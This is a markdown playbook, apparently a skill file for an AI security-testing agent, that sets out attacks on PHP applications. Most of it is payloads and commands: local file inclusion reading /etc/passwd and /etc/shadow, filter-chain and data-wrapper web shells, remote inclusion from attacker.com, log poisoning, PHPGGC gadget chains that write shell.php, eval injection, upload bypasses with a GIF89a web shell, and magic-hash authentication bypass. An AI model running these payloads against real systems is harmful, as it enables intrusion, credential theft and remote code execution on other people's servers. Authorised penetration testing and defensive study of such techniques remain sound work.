<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: php
description: Security testing playbook for generic PHP applications covering type juggling, file inclusion, deserialization, phpinfo exposure, eval injection, and PHP-specific misconfigurations
---

# PHP Security Testing

PHP powers a large portion of the web. Even when using frameworks, PHP-specific vulnerabilities are common: type juggling bypasses, file inclusion (LFI/RFI), PHP deserialization gadget chains, `phpinfo()` exposure, code execution via eval/assert, and session fixation.

---

## Reconnaissance

### Fingerprinting PHP

    # PHP-specific headers and paths
    X-Powered-By: PHP/8.1.0            # PHP version disclosure

    # Common PHP file extensions:
    .php, .php3, .php4, .php5, .php7, .phtml, .phar

    # Test extension alternatives:
    GET /index.php7
    GET /index.phtml
    GET /admin.phar

    # phpinfo() — extremely common misconfiguration
    GET /phpinfo.php
    GET /info.php
    GET /php-info.php
    GET /test.php
    GET /phptest.php
    GET /_phpinfo.php
    GET /check.php
    GET /status.php

    # Backup files (editor/deploy artifacts):
    GET /index.php~          # Vim backup
    GET /index.php.bak
    GET /index.php.old
    GET /index.php.save
    GET /config.php.bak
    GET /db.php.bak
    GET /.index.php.swp      # Vim swap

---

## PHP Type Juggling

PHP's loose comparison (`==`) has well-known coercion bugs:

    # Magic hashes — MD5 hashes that start with "0e" (scientific notation → 0):
    # If password stored as md5($pass) and compared with ==:
    # md5('240610708') = 0e462097431906509019562988736854  → 0 == 0
    # Send password: 240610708 → md5 starts with 0e → equals 0e hash of real password

    # Common magic hash values (for md5):
    240610708    → 0e462097431906509019562988736854
    QNKCDZO      → 0e830400451993494058024219903391
    aabg74ZBSIyv → 0e087386482136013740957780965295

    # SHA1 magic hashes:
    10932435112  → 0e07766915004133176347055865026811914715

    # Array bypass in PHP:
    # strcmp(array, string) == 0 → true in old PHP
    POST /login
    password[]=anything      # PHP converts to array

    # Type juggling in JSON:
    {"password": true}       # true == any string in PHP loose compare
    {"password": 0}          # 0 == "password" in PHP5

    # in_array loose check bypass:
    in_array("1shell.php", ["1","2","3"]) == true   # "1shell.php" == 1 (numeric)

---

## File Inclusion (LFI / RFI)

    # Local File Inclusion:
    GET /page.php?file=../../../../etc/passwd
    GET /index.php?lang=../../etc/passwd%00    # Null byte (PHP < 5.3.4)
    GET /page.php?include=php://filter/convert.base64-encode/resource=/etc/passwd

    # PHP filter chains (read any file as base64):
    GET /page.php?file=php://filter/convert.base64-encode/resource=config.php
    # Decode the base64 response to get source code

    # PHP filter chain for RCE (no file upload needed):
    # Tool: https://github.com/synacktiv/php_filter_chain_generator
    python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]);?>'
    GET /page.php?file=<generated_chain>&cmd=id

    # Data wrapper (RCE via LFI if allow_url_include=On):
    GET /page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
    GET /page.php?file=data://text/plain,<?php system('id');?>

    # Remote File Inclusion (RFI — requires allow_url_include=On):
    GET /page.php?file=http://attacker.com/shell.txt

    # LFI to RCE via log poisoning:
    # 1. Inject PHP code into log file via User-Agent:
    curl <target> -A "<?php system(\$_GET['cmd']); ?>"
    # 2. Include the log file:
    GET /page.php?file=/var/log/apache2/access.log&cmd=id

    # LFI via /proc/self/environ (older Linux):
    GET /page.php?file=/proc/self/environ
    # Inject PHP in User-Agent first, then include

    # Common files to read via LFI:
    /etc/passwd
    /etc/shadow
    /proc/self/environ
    /var/log/apache2/access.log
    /var/log/nginx/access.log
    /var/log/auth.log
    /var/www/html/config.php
    /var/www/html/.env
    /proc/self/fd/0               # stdin (may contain request data)

---

## PHP Deserialization

PHP `unserialize()` with user-controlled data enables object injection:

    # Detect: base64-encoded data starting with "O:" in cookie, parameter, or POST body
    # O:4:"User":1:{s:4:"name";s:5:"admin";}  = serialized User object

    # Craft malicious serialized object to abuse magic methods:
    # __destruct, __wakeup, __toString, __call are triggered automatically

    # Simple example (if class with __destruct doing file_put_contents exists):
    # O:4:"Foo":1:{s:4:"file";s:17:"/var/www/html/x.php";s:4:"data";s:25:"<?php system($_GET[0]);?>";}

    # Automated tool: PHPGGC (PHP Gadget Chains):
    phpggc -l                                    # List available chains
    phpggc -l | grep Symfony                     # Symfony chains
    phpggc -l | grep Laravel                     # Laravel chains

    # Common chains for popular PHP frameworks:
    phpggc Symfony/RCE4 system id                # Symfony gadget chain
    phpggc Laravel/RCE1 system id                # Laravel gadget chain
    phpggc Guzzle/FW1 write /var/www/html/shell.php "<?php system(\$_GET[0]);?>"

    # Generate base64 payload:
    phpggc -b Symfony/RCE4 system 'id'

    # Phar deserialization (PHP < 8.0 in stream wrappers):
    # phar:// wrapper triggers deserialization when file operations are performed
    GET /page.php?file=phar:///uploads/uploaded.jpg    # If .jpg is a crafted PHAR

---

## Code Execution via eval/assert/preg_replace

    # If user input reaches eval():
    GET /page.php?code=system('id')
    # PHP eval: eval("$code");

    # assert() in PHP < 7.0 executes string as PHP:
    GET /page.php?str=system('id')
    # assert($str);

    # preg_replace with /e modifier (PHP < 7.0):
    # preg_replace('/<pattern>/e', $replacement, $input)
    # If $replacement is user-controlled:
    GET /page.php?pattern=.&replace=system('id')

    # create_function (deprecated, still found):
    # create_function('', 'system("id");')

    # Dynamic function calls:
    # $func = $_GET['fn']; $func();
    GET /page.php?fn=phpinfo
    GET /page.php?fn=system&arg=id

---

## PHP Session Security

    # PHP session ID in cookie: PHPSESSID
    # Default storage: /tmp/sess_<PHPSESSID> on server

    # Session fixation:
    # 1. Get session ID before login
    # 2. Login — if session ID doesn't change = session fixation vulnerability

    # Session file LFI (if LFI exists):
    GET /page.php?file=/tmp/sess_<PHPSESSID>
    # Inject PHP into session data first:
    # Set a parameter that gets stored in session to PHP code

    # Session upload progress (LFI vector):
    # Upload file with PHP code in filename → session stores the filename
    # GET /page.php?file=/tmp/sess_<id>  → code execution

---

## PHP File Upload Bypass

    # Extension blacklist bypass:
    shell.php5, shell.php7, shell.phtml, shell.phar, shell.phps
    shell.Php (capital letter bypass)
    shell.php.jpg (double extension)
    shell.php%00.jpg (null byte, PHP < 5.3.4)
    shell.php     (trailing space)
    shell.php.     (trailing dot)

    # MIME type bypass:
    Content-Type: image/jpeg with PHP payload content

    # Magic bytes bypass (add image header):
    GIF89a;<?php system($_GET['cmd']);?>

    # .htaccess upload (if Apache and uploads served with AllowOverride):
    filename=".htaccess"
    Content: AddType application/x-httpd-php .jpg

---

## PHP Information Disclosure

    # phpinfo() exposure reveals:
    GET /phpinfo.php
    # - PHP version, extensions, compile flags
    # - Server software, document root, script path
    # - Environment variables (may include credentials)
    # - PHP configuration (allow_url_fopen, disable_functions, open_basedir)
    # - Loaded modules, Zend extensions

    # Key phpinfo fields to note:
    # disable_functions: list of blocked functions (cmd execution may be blocked)
    # open_basedir: directory restriction
    # allow_url_include: RFI possible if On
    # session.save_path: where sessions are stored

---

## PHP disable_functions Bypass

    # If exec/system/passthru blocked via disable_functions:
    # Method 1: PHP 7.x LD_PRELOAD bypass
    # Method 2: Imagick/GhostScript RCE bypass

    # Check disabled functions:
    # phpinfo() → disable_functions row

    # Common bypass libraries:
    # https://github.com/AntSwordProject/AntSword-Labs (disable_functions bypass)
    # Chankro tool for LD_PRELOAD bypass

---

## Pro Tips

1. `phpinfo.php`, `info.php`, `test.php` — check ALL of these, very commonly exposed
2. PHP filter chain generator creates RCE from LFI with no file upload needed
3. Type juggling with `0e` magic hashes bypasses MD5-based password verification
4. PHPGGC covers gadget chains for 30+ PHP frameworks — serialize attack any app
5. `php://filter/convert.base64-encode/resource=` reads any PHP file including config
6. Always test `.php~`, `.php.bak`, `.php.old` extensions for source code backups
7. Log poisoning via User-Agent is reliable LFI → RCE if Apache/Nginx log is readable

## Summary

PHP testing = `phpinfo.php` exposure + LFI via `php://filter` + type juggling auth bypass + deserialization (phpggc) + file upload extension bypass. PHP filter chains are the most powerful LFI technique — they enable RCE without any file upload. Type juggling (`0e` magic hashes, array bypass) breaks authentication in poorly coded apps. phpinfo() reveals the entire server configuration including disable_functions, enabling targeted exploitation.
